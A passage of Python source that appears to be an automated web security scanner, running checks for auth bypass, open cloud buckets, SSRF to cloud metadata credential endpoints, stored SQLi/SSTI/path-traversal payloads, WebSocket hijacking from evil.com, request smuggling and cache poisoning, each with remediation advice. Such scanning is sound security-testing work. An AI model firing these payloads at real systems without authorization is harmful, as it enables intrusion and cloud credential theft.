    # ── Path normalization bypasses ───────────────────────────────────────────
    norm_payloads = [
        ("/admin/users", "%2fadmin%2fusers"),
        ("/admin/users", "/admin/./users"),
        ("/admin/users", "/admin/users%20"),
        ("/admin/users", "/ADMIN/USERS"),
        ("/api/v1/admin", "/api/v1/Admin"),
    ]
    for (protected, bypass) in norm_payloads:
        st_p, _, _ = await s.http.get(base + protected)
        st_b, body, _ = await s.http.get(base + bypass)
        if st_b == 200 and st_p in (401, 403):
            add(s, "08-PATH-NORM-BYPASS", "HIGH",
                f"Path normalization bypass: {bypass}",
                base + bypass, f"Protected {protected} → {st_p}, encoded → {st_b}",
                "Normalize paths before routing/auth; case-fold consistently",
                tags=["AUTH_BYPASS"])
            return


# ═══════════════════════════════════════════════════════════════════════════════
# 09  CLOUD STORAGE ENUMERATION
# ═══════════════════════════════════════════════════════════════════════════════

async def check_cloud_storage(s: State):
    host = s.host
    company = host.split(".")[0]
    suffixes = ["", "-assets", "-uploads", "-static", "-media", "-files",
                "-backup", "-backups", "-data", "-prod", "-dev", "-staging",
                "-public", "-private", "-bucket", "-storage", "-cdn"]
    bucket_names = [f"{company}{suf}" for suf in suffixes] + \
                   [f"{company}-{host.replace('.', '-')}", company + ".com",
                    host.replace(".", "-")]

    # ── AWS S3 ────────────────────────────────────────────────────────────────
    for name in bucket_names[:12]:
        # Virtual-hosted style
        for region in ["us-east-1", "us-west-2", "eu-west-1", ""]:
            url = f"https://{name}.s3.amazonaws.com/" if not region else \
                  f"https://{name}.s3.{region}.amazonaws.com/"
            st, body, hdrs = await s.http.get(url)
            if st == 200 and ("ListBucketResult" in body or "<Contents>" in body):
                add(s, "09-S3-OPEN-BUCKET", "CRITICAL",
                    f"Open S3 bucket: {name}",
                    url, f"Public bucket listing: {body[:200]}",
                    "Set bucket ACL to private; use bucket policies to block public access; "
                    "enable S3 Block Public Access at account level",
                    cvss=9.8, tags=["INFO_DISC", "FILE_OPS"])
                return
            if st == 403:
                add(s, "09-S3-EXISTS", "INFO",
                    f"S3 bucket exists but access denied: {name}",
                    url, "403 → bucket exists, ACL restricts access",
                    "Verify no public objects exist via aws s3 ls s3://NAME --no-sign-request",
                    tags=["INFO_DISC"])

    # ── GCS ───────────────────────────────────────────────────────────────────
    for name in bucket_names[:8]:
        url = f"https://storage.googleapis.com/{name}/"
        st, body, _ = await s.http.get(url)
        if st == 200 and "ListBucketResult" in body:
            add(s, "09-GCS-OPEN-BUCKET", "CRITICAL",
                f"Open GCS bucket: {name}",
                url, body[:200],
                "Remove allUsers / allAuthenticatedUsers ACE from bucket",
                cvss=9.8, tags=["INFO_DISC"])
            return

    # ── Azure Blob ────────────────────────────────────────────────────────────
    for name in bucket_names[:8]:
        url = f"https://{company}.blob.core.windows.net/{name}?restype=container&comp=list"
        st, body, _ = await s.http.get(url)
        if st == 200 and "<EnumerationResults" in body:
            add(s, "09-AZURE-BLOB-OPEN", "CRITICAL",
                f"Open Azure Blob container: {name}",
                url, body[:200],
                "Set container access level to Private; use SAS tokens for authorized access",
                cvss=9.8, tags=["INFO_DISC"])
            return


# ═══════════════════════════════════════════════════════════════════════════════
# 10  KUBERNETES METADATA
# ═══════════════════════════════════════════════════════════════════════════════

async def check_kubernetes_metadata(s: State):
    # AWS IMDS (also covers ECS task metadata)
    imds_urls = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.170.2/v2/credentials",           # ECS
        "http://100.100.100.200/latest/meta-data/",      # Alibaba ECS
        "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure IMDS
    ]
    ssrf_param_paths = [
        (s.base + "/api/v1/fetch?url=", "GET"),
        (s.base + "/api/fetch?url=", "GET"),
        (s.base + "/proxy?url=", "GET"),
        (s.base + "/api/v1/preview?url=", "GET"),
    ]
    for imds in imds_urls[:3]:
        for path, method in ssrf_param_paths:
            st, body, _ = await s.http.get(path + urllib.parse.quote(imds))
            if st == 200 and any(k in body for k in
                                  ["ami-id", "instance-id", "iam", "computeMetadata",
                                   "access_key_id", "secret_access_key", "token",
                                   "subscriptionId", "location"]):
                add(s, "10-SSRF-IMDS", "CRITICAL",
                    f"SSRF → Cloud IMDS: {imds}",
                    path + urllib.parse.quote(imds),
                    f"IMDS response: {body[:200]}",
                    "Block 169.254.169.254 and metadata endpoints in SSRF defenses; "
                    "use IMDSv2 (PUT-required) on AWS; restrict metadata service access",
                    cvss=9.9, tags=["SSRF", "INFO_DISC"])
                return

    # ── Kubernetes API server ─────────────────────────────────────────────────
    k8s_urls = [
        (s.base.replace("https://", "https://").split(":")[0] + ":6443/api/v1/namespaces/", "K8s API"),
        (s.base + "/api/v1/namespaces/default/secrets", "via app"),
        ("https://kubernetes.default.svc/api/v1/", "internal"),
        (s.base + "/metrics", "kubelet metrics"),
    ]
    for url, label in k8s_urls[:2]:
        st, body, _ = await s.http.get(url)
        if st == 200 and ("namespaces" in body or "secrets" in body or "apiVersion" in body):
            add(s, "10-K8S-API-EXPOSED", "CRITICAL",
                f"Kubernetes API server exposed ({label})",
                url, f"Response: {body[:150]}",
                "Require authentication for all K8s API endpoints; "
                "use NetworkPolicy to restrict API server access; audit RBAC bindings",
                cvss=9.8, tags=["INFO_DISC", "AUTH_BYPASS", "ADMIN"])
            return

    # ── ServiceAccount token in environment ───────────────────────────────────
    # Check if app leaks SA token via debug/env endpoint
    for path in ["debug", "actuator/env", "_debug", "api/v1/debug", "env"]:
        st, body, _ = await s.http.get(f"{s.base.rstrip('/')}/{path}")
        if st == 200 and "KUBERNETES_SERVICE" in body:
            add(s, "10-K8S-SA-LEAK", "HIGH",
                "Kubernetes ServiceAccount token / env vars leaked via debug endpoint",
                f"{s.base.rstrip('/')}/{path}",
                f"KUBERNETES_SERVICE env var in response",
                "Disable debug endpoints in production; restrict SA token permissions via RBAC",
                tags=["INFO_DISC", "ADMIN"])
            return


# ═══════════════════════════════════════════════════════════════════════════════
# 11  API GATEWAY BYPASS
# ═══════════════════════════════════════════════════════════════════════════════

async def check_api_gateway_bypass(s: State):
    host = s.host
    base = s.base.rstrip("/")

    # ── Direct origin IP access (bypass WAF / gateway) ────────────────────────
    try:
        ips = list({r[4][0] for r in socket.getaddrinfo(host, 443)})[:3]
        for ip in ips:
            url = f"https://{ip}/api/v1/admin"
            st, body, _ = await s.http.get(url, headers={"Host": host})
            if st in (200, 201):
                add(s, "11-GATEWAY-BYPASS-IP", "HIGH",
                    f"API gateway bypass via direct IP: {ip}",
                    url, f"Direct IP request → {st}",
                    "Block direct IP access at origin; validate Host header; "
                    "require gateway-specific header (e.g. X-Forwarded-By: my-gateway)",
                    tags=["AUTH_BYPASS", "ADMIN"])
                return
    except Exception:
        pass

    # ── Stage / version bypass ─────────────────────────────────────────────────
    # Older API versions may skip auth checks
    versions = ["v0", "v1", "v2", "v3", "v4", "internal", "beta", "legacy", "test"]
    for v in versions:
        for protected in ["admin/users", "users", "admin"]:
            url = f"{base}/api/{v}/{protected}"
            st, body, _ = await s.http.get(url)
            if st == 200 and len(body) > 50:
                add(s, "11-API-VERSION-BYPASS", "HIGH",
                    f"Auth bypass via API version: /api/{v}/{protected}",
                    url, f"Older API version → {st}",
                    "Apply consistent auth middleware to all API versions; deprecate old versions",
                    tags=["AUTH_BYPASS", "ADMIN"])
                return

    # ── X-Original-URL / X-Forwarded-URI bypass ──────────────────────────────
    bypass_headers = [
        {"X-Original-URL": "/admin"},
        {"X-Rewrite-URL": "/admin"},
        {"X-Override-URL": "/admin"},
        {"X-HTTP-Method-Override": "GET"},
        {"X-Original-Host": f"admin.{host}"},
    ]
    for hdrs in bypass_headers:
        st, body, _ = await s.http.get(base + "/index.html", headers=hdrs)
        if st in (200, 201) and len(body) > 100:
            add(s, "11-HEADER-BYPASS", "HIGH",
                f"Auth bypass via {list(hdrs.keys())[0]} header",
                base + "/index.html",
                f"Header {list(hdrs.items())[0]} → {st}",
                "Ignore X-Original-URL and similar headers from untrusted clients",
                tags=["AUTH_BYPASS"])
            return


# ═══════════════════════════════════════════════════════════════════════════════
# 12  HTTP PARAMETER POLLUTION
# ═══════════════════════════════════════════════════════════════════════════════

async def check_parameter_pollution(s: State):
    base = s.base.rstrip("/")

    # ── HPP in query string ───────────────────────────────────────────────────
    # Backend uses second value, WAF/validation uses first
    hpp_tests = [
        (base + "/api/v1/users?id=1&id=2", "duplicate id"),
        (base + "/api/v1/transfer?amount=1&amount=99999", "duplicate amount"),
        (base + "/api/v1/users?role=user&role=admin", "duplicate role"),
        (base + "/api/v1/orders?status=pending&status=approved", "duplicate status"),
        (base + "/api/v1/invoice?discount=0&discount=100", "duplicate discount"),
    ]
    for url, label in hpp_tests:
        st, body, _ = await s.http.get(url,
            headers={"Authorization": f"Bearer {s.token}" if s.token else ""})
        if st == 200 and any(k in body.lower() for k in
                              ["admin", "approved", "99999", "100%", "\"role\":\"admin\""]):
            add(s, "12-HPP", "HIGH",
                f"HTTP Parameter Pollution: {label}",
                url, f"Duplicate param → {st}, response may use second value: {body[:150]}",
                "Define consistent behavior for duplicate parameters; last-wins vs first-wins consistency",
                tags=["INJECTION", "BUSINESS_LOGIC"])
            return

    # ── JSON key collision ────────────────────────────────────────────────────
    # Some parsers use last value, others first — bypass validation
    import json
    collision_body = '{"role": "user", "role": "admin", "amount": 1, "amount": 99999}'
    for path in ["api/v1/users/me", "api/v1/profile", "api/v1/account"]:
        url = f"{base}/{path}"
        st, body, _ = await s.http.put(url, data=collision_body,
            headers={"Content-Type": "application/json",
                     "Authorization": f"Bearer {s.token}" if s.token else ""})
        if st in (200, 201) and "admin" in body.lower():
            add(s, "12-JSON-KEY-COLLISION", "HIGH",
                "JSON key collision — duplicate key allows role escalation",
                url, f"Duplicate JSON key → {st}, admin in response",
                "Use a strict JSON parser that rejects duplicate keys",
                tags=["INJECTION", "MASS_ASSIGN"])
            return


# ═══════════════════════════════════════════════════════════════════════════════
# 13  SECOND-ORDER INJECTION
# ═══════════════════════════════════════════════════════════════════════════════

async def check_second_order(s: State):
    base = s.base.rstrip("/")
    tok = {"Authorization": f"Bearer {s.token}"} if s.token else {}

    # Store payloads in profile fields, then retrieve and check execution
    second_order_payloads = {
        "username": "admin'--",
        "first_name": "{{7*7}}",
        "last_name": "../../../etc/passwd",
        "bio": "<script>alert(1)</script>",
        "display_name": "${7*7}",
        "email_prefix": "test+admin'--",
    }

    # Step 1: Store
    st_w, _, _ = await s.http.put(
        base + "/api/v1/profile",
        json=second_order_payloads,
        headers={**tok, "Content-Type": "application/json"})

    # Step 2: Retrieve and look for side effects
    if st_w in (200, 201):
        st_r, body_r, _ = await s.http.get(base + "/api/v1/profile", headers=tok)
        if st_r == 200:
            if "49" in body_r and "{{7*7}}" not in body_r:
                add(s, "13-SECOND-ORDER-SSTI", "CRITICAL",
                    "Second-order SSTI — {{7*7}} stored then evaluated to 49",
                    base + "/api/v1/profile",
                    "Stored {{7*7}} → retrieved as 49",
                    "Sanitize stored data before any template rendering; "
                    "never pass stored user data directly to template engines",
                    cvss=9.8, tags=["SSTI", "INJECTION"])
                return
            sql_errors = re.compile(r"(sql syntax|mysql_fetch|ora-\d|pg::|syntax error)", re.I)
            if sql_errors.search(body_r) and "admin'--" in str(second_order_payloads.values()):
                add(s, "13-SECOND-ORDER-SQLI", "CRITICAL",
                    "Second-order SQLi — stored SQL payload triggers error on retrieve",
                    base + "/api/v1/profile",
                    f"SQL error in response: {sql_errors.search(body_r).group(0)}",
                    "Parameterize all database queries including those reading from stored data",
                    cvss=9.8, tags=["SQLI", "INJECTION"])
                return
            if "root:" in body_r or "/bin/" in body_r:
                add(s, "13-SECOND-ORDER-LFI", "CRITICAL",
                    "Second-order LFI — stored path traversal reads /etc/passwd",
                    base + "/api/v1/profile",
                    "Stored ../../../etc/passwd → /etc/passwd content retrieved",
                    "Validate/sanitize file paths from stored data; use allowlists",
                    cvss=9.8, tags=["PATH_TRAVERSAL", "INFO_DISC"])
                return


# ═══════════════════════════════════════════════════════════════════════════════
# 14  POSTMESSAGE VULNERABILITIES
# ═══════════════════════════════════════════════════════════════════════════════

async def check_postmessage(s: State):
    base = s.base.rstrip("/")
    st, body, _ = await s.http.get(base)
    if not body:
        return

    # Detect wildcard postMessage origin (*) in JS
    wildcard_pm = re.compile(
        r"""\.(?:postMessage|addEventListener)\s*\([^)]*?\*[^)]*?\)""",
        re.I | re.S)

    # Detect message listeners with no origin check
    listener_no_check = re.compile(
        r"""addEventListener\s*\(\s*['"]message['"]\s*,\s*(?:async\s+)?function[^{]*\{(?:(?!event\.origin|e\.origin|msg\.origin|message\.origin).)*?\}""",
        re.I | re.S)

    # Detect sensitive data sent via postMessage
    sensitive_pm = re.compile(
        r"""\.postMessage\s*\(\s*(?:JSON\.stringify\s*\()?\s*\{[^}]*(?:token|password|secret|auth|key|session|cookie)[^}]*\}""",
        re.I)

    # Fetch and scan all JS files mentioned in HTML
    js_urls = [s.base.rstrip("/") + m.group(1)
               for m in re.finditer(r'src=["\'](/[^"\']+\.js[^"\']*)["\']', body)]

    all_js = body
    for url in js_urls[:8]:
        _, js_body, _ = await s.http.get(url)
        all_js += js_body

    if wildcard_pm.search(all_js):
        add(s, "14-POSTMESSAGE-WILDCARD", "MEDIUM",
            "postMessage with wildcard origin (*) — cross-origin message accepted from any domain",
            base, "Found: .postMessage(..., '*') or addEventListener with wildcard",
            "Always specify target origin in postMessage; validate event.origin in listeners",
            tags=["CORS", "XSS"])

    if sensitive_pm.search(all_js):
        add(s, "14-POSTMESSAGE-SENSITIVE", "HIGH",
            "Sensitive data (token/auth/key) transmitted via postMessage",
            base,
            f"Found: {sensitive_pm.search(all_js).group(0)[:100]}",
            "Never send tokens or credentials via postMessage; use secure HTTP-only cookies",
            tags=["INFO_DISC"])

    if listener_no_check.search(all_js[:50000]):
        add(s, "14-POSTMESSAGE-NO-ORIGIN", "MEDIUM",
            "message event listener with no origin validation",
            base, "message listener does not check event.origin",
            "Always validate event.origin against expected domain before processing messages",
            tags=["XSS", "INJECTION"])


# ═══════════════════════════════════════════════════════════════════════════════
# 15  DEPENDENCY CONFUSION
# ═══════════════════════════════════════════════════════════════════════════════

async def check_dependency_confusion(s: State):
    base = s.base.rstrip("/")

    # Find package.json or requirements.txt to extract internal package names
    for path in ["package.json", "package-lock.json", "requirements.txt",
                 "Pipfile", "Gemfile", "go.mod", "pom.xml", "build.gradle"]:
        st, body, _ = await s.http.get(f"{base}/{path}")
        if st != 200 or not body:
            continue

        internal_clues = []
        if "package.json" in path:
            try:
                pkg = json.loads(body)
                deps = {**pkg.get("dependencies", {}),
                        **pkg.get("devDependencies", {}),
                        **pkg.get("peerDependencies", {})}
                # Internal packages often use @company/ scope or company- prefix
                company = s.host.split(".")[0]
                for dep in deps:
                    if (dep.startswith(f"@{company}") or
                        dep.startswith(company + "-") or
                        "internal" in dep.lower() or
                        "private" in dep.lower() or
                        dep.startswith("@") and company[:3] in dep.lower()):
                        internal_clues.append(dep)
            except Exception:
                pass

        if internal_clues:
            add(s, "15-DEP-CONFUSION", "HIGH",
                f"Dependency confusion candidates: {', '.join(internal_clues[:5])}",
                f"{base}/{path}",
                f"Internal package names exposed: {internal_clues[:5]}",
                "Use private registry scoping with --registry; configure package manager to "
                "always prefer internal registry for @company/ scope packages; "
                "pre-register internal package names on public registries",
                tags=["INFO_DISC", "INJECTION"])
            return

        add(s, "15-DEP-CONF-FILE-EXPOSED", "MEDIUM",
            f"Dependency manifest accessible: /{path}",
            f"{base}/{path}",
            f"Status {st} — package list may reveal internal/private dependency names",
            "Restrict access to dependency manifests; move to non-public paths",
            tags=["INFO_DISC"])
        return


# ═══════════════════════════════════════════════════════════════════════════════
# 16  COOKIE SECURITY
# ═══════════════════════════════════════════════════════════════════════════════

async def check_cookie_security(s: State):
    base = s.base.rstrip("/")
    # Get cookies from login or main page
    for path in ["", "login", "api/v1/login", "auth/login"]:
        url = f"{base}/{path}"
        st, body, hdrs = await s.http.get(url)
        if not hdrs.get("Set-Cookie"):
            continue

        cookies_raw = hdrs.get("Set-Cookie", "")

        # ── SameSite ──────────────────────────────────────────────────────────
        if "samesite=none" in cookies_raw.lower() and "secure" in cookies_raw.lower():
            add(s, "16-COOKIE-SAMESITE-NONE", "MEDIUM",
                "Session cookie SameSite=None — CSRF possible from cross-origin",
                url, f"Set-Cookie: {cookies_raw[:100]}",
                "Use SameSite=Lax or SameSite=Strict; only use None with explicit cross-site requirement",
                tags=["CSRF"])

        if "samesite" not in cookies_raw.lower():
            add(s, "16-COOKIE-NO-SAMESITE", "MEDIUM",
                "Session cookie missing SameSite attribute",
                url, f"Set-Cookie: {cookies_raw[:100]}",
                "Add SameSite=Lax to all session cookies",
                tags=["CSRF"])

        # ── HttpOnly / Secure ──────────────────────────────────────────────────
        if "httponly" not in cookies_raw.lower():
            add(s, "16-COOKIE-NO-HTTPONLY", "HIGH",
                "Session cookie missing HttpOnly — accessible to JavaScript (XSS → session theft)",
                url, f"Set-Cookie: {cookies_raw[:100]}",
                "Add HttpOnly flag to all session cookies",
                tags=["XSS", "INFO_DISC"])

        if "secure" not in cookies_raw.lower() and "https" in base:
            add(s, "16-COOKIE-NO-SECURE", "MEDIUM",
                "Session cookie missing Secure flag — may be sent over HTTP",
                url, f"Set-Cookie: {cookies_raw[:100]}",
                "Add Secure flag to all session cookies on HTTPS sites",
                tags=["INFO_DISC"])

        # ── __Host- / __Secure- prefix ────────────────────────────────────────
        auth_cookies = re.findall(r'(session|auth|token|jwt|access)[^\s;,]*',
                                   cookies_raw, re.I)
        for c in auth_cookies:
            if not c.startswith("__Host-") and not c.startswith("__Secure-"):
                add(s, "16-COOKIE-NO-PREFIX", "LOW",
                    f"Auth cookie '{c}' missing __Host- prefix — cookie tossing risk",
                    url, f"Cookie name: {c}",
                    "Use __Host- prefix for session cookies: prevents subdomain cookie injection",
                    tags=["CSRF", "AUTH_BYPASS"])
                break
        return


# ═══════════════════════════════════════════════════════════════════════════════
# 17  WEBSOCKET HIJACKING (CSWSH)
# ═══════════════════════════════════════════════════════════════════════════════

async def check_websocket(s: State):
    base = s.base.rstrip("/")
    # Find WebSocket endpoints from HTML/JS
    st, body, _ = await s.http.get(base)
    ws_patterns = re.compile(r"""(?:new WebSocket|io\(|SockJS\(|signalR|EventSource)\s*\(\s*['"`]((?:wss?://|/)[^'"`\s]{3,150})['"`]""")
    ws_urls = ws_patterns.findall(body)

    # Common WS paths
    ws_paths = ["ws", "wss", "socket", "socket.io/", "sockjs/", "websocket",
                "chat", "live", "events", "stream", "api/ws", "api/v1/ws"]

    for path in ws_paths[:5]:
        for scheme in ["wss", "ws"]:
            ws_url = f"{scheme}://{s.host}/{path}"
            ws_urls.append(ws_url)

    if not ws_urls:
        return

    # Test CSWSH: connect from evil origin
    try:
        import aiohttp
        for ws_url in ws_urls[:5]:
            try:
                async with aiohttp.ClientSession() as sess:
                    async with sess.ws_connect(
                        ws_url,
                        headers={"Origin": "https://evil.com",
                                 "Cookie": ""},
                        ssl=False,
                        timeout=aiohttp.ClientTimeout(total=5)
                    ) as ws:
                        # If connection succeeds from evil origin → CSWSH
                        add(s, "17-CSWSH", "HIGH",
                            f"Cross-Site WebSocket Hijacking — connection from evil.com accepted",
                            ws_url,
                            "Origin: evil.com → WS connection established without rejection",
                            "Validate Origin header on WebSocket upgrade; require auth token in first message",
                            cvss=8.8, tags=["WEBSOCKET", "AUTH_BYPASS", "CSRF"])
                        return
            except Exception:
                pass
    except Exception:
        pass

    # Report WS endpoints found (for manual testing)
    if ws_urls:
        add(s, "17-WS-FOUND", "INFO",
            f"WebSocket endpoints found: {ws_urls[0]}",
            ws_urls[0],
            f"Test manually: wscat -c {ws_urls[0]} --header 'Origin: https://evil.com'",
            "Validate Origin header; require auth in handshake or first message",
            tags=["WEBSOCKET"])


# ═══════════════════════════════════════════════════════════════════════════════
# 18  ADVANCED BUSINESS LOGIC
# ═══════════════════════════════════════════════════════════════════════════════

async def check_business_logic_advanced(s: State):
    base = s.base.rstrip("/")
    tok = {"Authorization": f"Bearer {s.token}"} if s.token else {}

    # ── Negative price / amount ───────────────────────────────────────────────
    neg_payloads = [
        {"amount": -100, "to": "attacker"},
        {"price": -99.99},
        {"quantity": -1},
        {"credits": -1000},
        {"discount": 110},   # >100% discount
        {"tip": -50},
    ]
    for path in ["api/v1/transfer", "api/v1/orders", "api/v1/payment",
                 "api/v1/checkout", "api/v1/purchase", "checkout"]:
        url = f"{base}/{path}"
        for payload in neg_payloads[:3]:
            st, body, _ = await s.http.post(url, json=payload,
                headers={**tok, "Content-Type": "application/json"})
            if st in (200, 201):
                add(s, "18-NEG-AMOUNT", "CRITICAL",
                    f"Negative/overflow amount accepted: {payload}",
                    url, f"payload={payload} → {st}",
                    "Validate amount > 0 server-side; use server-side price lookup not client-submitted prices",
                    cvss=9.1, tags=["BUSINESS_LOGIC", "INJECTION"])
                return

    # ── Integer overflow ──────────────────────────────────────────────────────
    overflow_amounts = [2**31, 2**31 - 1, 2**32, 9999999999, 0.000001]
    for path in ["api/v1/orders", "api/v1/transfer", "api/v1/purchase"]:
        url = f"{base}/{path}"
        for amount in overflow_amounts[:2]:
            st, body, _ = await s.http.post(url,
                json={"amount": amount, "quantity": amount},
                headers={**tok, "Content-Type": "application/json"})
            if st in (200, 201):
                add(s, "18-INT-OVERFLOW", "HIGH",
                    f"Integer overflow accepted: amount={amount}",
                    url, f"amount={amount} → {st}",
                    "Use BigDecimal/Decimal128 for monetary values; validate upper bounds",
                    tags=["BUSINESS_LOGIC"])
                return

    # ── Race condition on coupon/balance ──────────────────────────────────────
    # Send 20 simultaneous requests
    for path in ["api/v1/coupon/apply", "api/v1/promo/apply",
                 "api/v1/discount/apply", "coupon/use", "promo/redeem"]:
        url = f"{base}/{path}"
        payload = {"code": "SAVE10", "coupon": "SAVE10", "promo_code": "SAVE10"}
        tasks = [s.http.post(url, json=payload,
                              headers={**tok, "Content-Type": "application/json"})
                 for _ in range(20)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        success = [r for r in results if not isinstance(r, Exception) and r[0] in (200, 201)]
        if len(success) > 1:
            add(s, "18-RACE-COUPON", "HIGH",
                f"Race condition on {path} — {len(success)}/20 parallel requests succeeded",
                url, f"{len(success)} simultaneous coupon applies accepted",
                "Use database-level atomic operations (SELECT FOR UPDATE); "
                "implement idempotency keys; use Redis SETNX for coupon locking",
                cvss=7.5, tags=["RACE_CONDITION", "BUSINESS_LOGIC"])
            return


# ═══════════════════════════════════════════════════════════════════════════════
# 19  DNS REBINDING SURFACE
# ═══════════════════════════════════════════════════════════════════════════════

async def check_dns_rebinding(s: State):
    base = s.base.rstrip("/")

    # DNS rebinding works when:
    # 1. CORS allows attacker's origin
    # 2. No IP validation on incoming requests
    # 3. Service binds to 0.0.0.0 not 127.0.0.1

    # Check CORS with an IP-like origin
    test_origins = ["http://127.0.0.1", "http://localhost", "http://0.0.0.0",
                    "http://169.254.169.254"]
    for origin in test_origins:
        st, body, hdrs = await s.http.get(base + "/api/v1/users/me",
            headers={"Origin": origin,
                     "Authorization": f"Bearer {s.token}" if s.token else ""})
        acao = hdrs.get("Access-Control-Allow-Origin", "")
        acac = hdrs.get("Access-Control-Allow-Credentials", "false")
        if acao == origin and acac.lower() == "true":
            add(s, "19-DNS-REBINDING-SURFACE", "HIGH",
                f"DNS rebinding attack surface: CORS accepts internal origin {origin}",
                base + "/api/v1/users/me",
                f"Origin: {origin} → ACAO: {acao}, ACAC: {acac}",
                "Validate Origin against allowlist; reject private/loopback IP origins; "
                "implement CSRF tokens as secondary defense",
                tags=["CORS", "AUTH_BYPASS"])
            return


# ═══════════════════════════════════════════════════════════════════════════════
# 20  HTTP/2 DOWNGRADE / h2c SMUGGLING
# ═══════════════════════════════════════════════════════════════════════════════

async def check_h2c_smuggling(s: State):
    base = s.base.rstrip("/")

    # h2c upgrade: send HTTP/1.1 Upgrade: h2c request
    # If backend proxies it, the h2c tunnel bypasses WAF/proxy auth
    h2c_headers = {
        "Upgrade": "h2c",
        "HTTP2-Settings": "AAMAAABkAAQAAP__",
        "Connection": "Upgrade, HTTP2-Settings",
    }
    for path in ["/api/v1/admin", "/admin", "/"]:
        st, body, hdrs = await s.http.req("GET", base + path, headers=h2c_headers)
        if st == 101 or (st == 200 and "upgrade" in hdrs.get("Connection", "").lower()):
            add(s, "20-H2C-SMUGGLING", "HIGH",
                "HTTP/2 cleartext (h2c) upgrade accepted — potential request smuggling",
                base + path,
                f"Upgrade: h2c → {st}, Connection: {hdrs.get('Connection','')}",
                "Reject h2c upgrade requests at edge/proxy; use h2 (TLS) only",
                tags=["HTTP_SMUGGLING", "AUTH_BYPASS"])
            return

    # Check for HTTP/1.1 request smuggling indicators
    # CL.TE: send conflicting Content-Length and Transfer-Encoding headers
    smuggle_req = (
        f"POST {base}/api/v1/health HTTP/1.1\r\n"
        f"Host: {s.host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "G"
    )
    # Note: actual low-level socket test requires raw socket; mark as manual
    add(s, "20-HTTP-SMUGGLING-NOTE", "INFO",
        "HTTP Request Smuggling — test manually with CL.TE / TE.CL probes",
        base,
        "Use Burp Suite HTTP Request Smuggler extension for definitive test",
        "Normalize Transfer-Encoding headers at proxy layer; use HTTP/2 end-to-end",
        tags=["HTTP_SMUGGLING"])


# ═══════════════════════════════════════════════════════════════════════════════
# 21  ADVANCED CACHE POISONING
# ═══════════════════════════════════════════════════════════════════════════════

async def check_cache_poison_advanced(s: State):
    base = s.base.rstrip("/")

    # ── Fat GET (request body in GET) ─────────────────────────────────────────
    st, body, hdrs = await s.http.req("GET", base + "/api/v1/search",
        data=b'{"query": "poison"}',
        headers={"Content-Type": "application/json",
                 "Content-Length": "18",
                 "X-HTTP-Method-Override": "POST"})
    if st == 200 and "poison" in body:
        add(s, "21-FAT-GET", "MEDIUM",
            "Fat GET accepted — request body processed in GET request",
            base + "/api/v1/search",
            "GET with JSON body → body content reflected",
            "Ignore request body on GET requests; request body is unkeyed by most caches",
            tags=["CACHE_POISON", "INJECTION"])

    # ── Parameter cloaking (cache key vs backend disagree on param parsing) ───
    cloak_urls = [
        base + "/api/v1/users?id=1&utm_source=abc?id=2",  # param after ?
        base + "/api/v1/users?id=1%26id=2",               # encoded &
        base + "/api/v1/users?id=1;id=2",                 # semicolon separator
    ]
    st0, body0, _ = await s.http.get(base + "/api/v1/users?id=1")
    for url in cloak_urls:
        st, body, _ = await s.http.get(url)
        if st == 200 and body != body0 and len(body) > 50:
            add(s, "21-PARAM-CLOAKING", "HIGH",
                "Cache parameter cloaking — backend parses param differently from cache key",
                url, f"Cloaked URL returns different content than canonical",
                "Normalize query strings before caching; use consistent param parsing",
                tags=["CACHE_POISON"])
            return

    # ── Unkeyed port ──────────────────────────────────────────────────────────
    for port in ["443", "80", "8080", "1337"]:
        st, body, hdrs = await s.http.get(base + "/",
            headers={"Host": f"{s.host}:{port}"})
        cache_status = hdrs.get("X-Cache", "") + hdrs.get("CF-Cache-Status", "")
        if st == 200 and "miss" in cache_status.lower():
            add(s, "21-UNKEYED-PORT", "MEDIUM",
                f"Host port may be unkeyed in cache: Host: {s.host}:{port}",
                base + "/",
                f"Non-standard port in Host header → {st}, cache: {cache_status}",
                "Normalize Host header (strip port) before using as cache key",
                tags=["CACHE_POISON"])
            return


# ═══════════════════════════════════════════════════════════════════════════════
# 22  SSRF CHAIN
# ═══════════════════════════════════════════════════════════════════════════════

async def check_ssrf_chain(s: State):
    base = s.base.rstrip("/")
    tok = {"Authorization": f"Bearer {s.token}"} if s.token else {}

    # Full SSRF chain: cloud metadata → IAM creds → lateral movement indicators
    ssrf_chains = [
        # AWS full chain
        ("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
         ["role", "AccessKeyId", "SecretAccessKey", "Token"], "AWS IAM credential chain"),
        # GCP
        ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
         ["access_token", "token_type"], "GCP SA token"),
        # Azure
        ("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
         ["access_token"], "Azure IMDS token"),
        # Kubernetes API via SSRF
        ("https://kubernetes.default.svc/api/v1/namespaces/",
         ["namespaces", "apiVersion"], "Kubernetes API"),
        # Internal Redis
        ("http://127.0.0.1:6379/",
         ["-ERR", "+PONG", "redis"], "Internal Redis"),
        # Internal Elasticsearch
        ("http://127.0.0.1:9200/_cat/indices",
         ["health", "status", "index"], "Internal Elasticsearch"),
        # Internal MongoDB
        ("http://127.0.0.1:27017/",
         ["MongoDB", "mongodb"], "Internal MongoDB"),
    ]

    ssrf_params = ["url", "uri", "target", "redirect", "endpoint", "webhook",
                   "src", "href", "ref", "fetch", "resource", "proxy", "link",
                   "image", "img", "source", "dest", "destination", "path",
                   "next", "continue", "return_url", "callback", "out"]

    ssrf_paths = [
        base + "/api/v1/fetch",
        base + "/api/v1/proxy",
        base + "/api/fetch",
        base + "/proxy",
        base + "/fetch",
        base + "/api/v1/preview",
        base + "/api/v1/screenshot",
        base + "/api/v1/import",
        base + "/webhook",
    ]

    for ssrf_url, ssrf_paths_local in [(p, ssrf_paths) for p in ssrf_paths]:
        for target_url, indicators, chain_name in ssrf_chains[:4]:
            for param in ssrf_params[:5]:
                url = f"{ssrf_url}?{param}={urllib.parse.quote(target_url)}"
                st, body, _ = await s.http.get(url, headers=tok)
                if st == 200 and any(ind.lower() in body.lower() for ind in indicators):
                    add(s, "22-SSRF-CHAIN", "CRITICAL",
